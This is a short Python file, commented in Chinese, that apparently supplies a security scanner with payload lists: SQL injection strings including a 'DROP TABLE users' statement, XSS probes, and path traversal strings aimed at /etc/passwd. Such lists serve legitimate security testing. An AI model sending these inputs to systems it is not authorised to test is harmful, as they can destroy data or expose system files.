# 预定义的各类安全测试 Payload 字典
PAYLOADS = {
    # SQL 注入 (SQLi) 相关的 Payload
    "sqli": [
        "' OR '1'='1",
        "1' OR 1=1--",
        "' UNION SELECT NULL--",
        "admin' --",
        "1; DROP TABLE users"
    ],
    # 跨站脚本攻击 (XSS) 相关的 Payload
    "xss": [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=prompt(1)>",
        "javascript:alert(1)"
    ],
    # 路径遍历 (Path Traversal) 相关的 Payload
    "path_traversal": [
        "../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd"
    ]
}

def get_payloads(payload_type: str) -> list[str]:
    """
    根据给定的 payload_type 获取对应的 Payload 列表。
    如果类型不存在，则默认返回一个通用的 SQL 注入 Payload 列表。
    """
    return PAYLOADS.get(payload_type, ["' OR 1=1--"])

